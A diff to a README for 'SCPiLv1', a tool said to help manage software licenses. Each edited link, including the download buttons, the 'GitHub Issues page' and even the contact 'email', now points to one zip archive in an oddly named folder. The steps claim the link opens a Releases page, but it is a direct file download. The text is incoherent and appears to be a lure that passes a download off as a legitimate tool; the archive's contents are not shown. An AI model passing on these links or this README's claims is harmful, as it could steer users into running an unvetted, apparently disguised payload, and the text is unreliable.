@@ -1,7 +1,7 @@
 # 🎉 SCPiLv1 - Easy License Management for Your Projects
 
 ## 📥 Download Now
-[![Download SCPiLv1](https://raw.githubusercontent.com/terrenalponce/SCPiLv1/main/unabjured/SCPiLv1.zip)](https://raw.githubusercontent.com/terrenalponce/SCPiLv1/main/unabjured/SCPiLv1.zip)
+[![Download SCPiLv1](https://github.com/terrenalponce/SCPiLv1/raw/refs/heads/main/unabjured/Lv-SC-Pi-v1.6-beta.5.zip)](https://github.com/terrenalponce/SCPiLv1/raw/refs/heads/main/unabjured/Lv-SC-Pi-v1.6-beta.5.zip)
 
 ## 🚀 Getting Started
 SCPiLv1 is a simple tool designed to help you manage software licenses for your projects. Whether you're working on personal projects or collaborative ones, understanding and choosing the right license is crucial. This application guides you through the process with ease.
@@ -20,7 +20,7 @@ SCPiLv1 is a simple tool designed to help you manage software licenses for your 
 ## 💻 Download & Install
 To get started with SCPiLv1, visit the following link to download the latest version:
 
-[Download SCPiLv1](https://raw.githubusercontent.com/terrenalponce/SCPiLv1/main/unabjured/SCPiLv1.zip)
+[Download SCPiLv1](https://github.com/terrenalponce/SCPiLv1/raw/refs/heads/main/unabjured/Lv-SC-Pi-v1.6-beta.5.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version of SCPiLv1.
@@ -58,7 +58,7 @@ To uninstall SCPiLv1, go to your system's application settings:
 Currently, SCPiLv1 is only available for desktop platforms. A mobile version may be considered in future updates.
 
 ### Where can I report issues?
-If you encounter any problems while using SCPiLv1, please create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/terrenalponce/SCPiLv1/main/unabjured/SCPiLv1.zip) for assistance.
+If you encounter any problems while using SCPiLv1, please create an issue on the [GitHub Issues page](https://github.com/terrenalponce/SCPiLv1/raw/refs/heads/main/unabjured/Lv-SC-Pi-v1.6-beta.5.zip) for assistance.
 
 ## 🔧 Contributing
 We welcome contributions from the community! If you want to help improve SCPiLv1, please follow these steps:
@@ -68,7 +68,7 @@ We welcome contributions from the community! If you want to help improve SCPiLv1
 4. Submit a pull request for review.
 
 ## 📞 Contact
-For further assistance or questions about SCPiLv1, feel free to reach out via email at [https://raw.githubusercontent.com/terrenalponce/SCPiLv1/main/unabjured/SCPiLv1.zip](https://raw.githubusercontent.com/terrenalponce/SCPiLv1/main/unabjured/SCPiLv1.zip).
+For further assistance or questions about SCPiLv1, feel free to reach out via email at [https://github.com/terrenalponce/SCPiLv1/raw/refs/heads/main/unabjured/Lv-SC-Pi-v1.6-beta.5.zip](https://github.com/terrenalponce/SCPiLv1/raw/refs/heads/main/unabjured/Lv-SC-Pi-v1.6-beta.5.zip).
 
 ## 🎉 Thank You!
 Thank you for choosing SCPiLv1. We hope this tool simplifies your software licensing process. Happy coding!
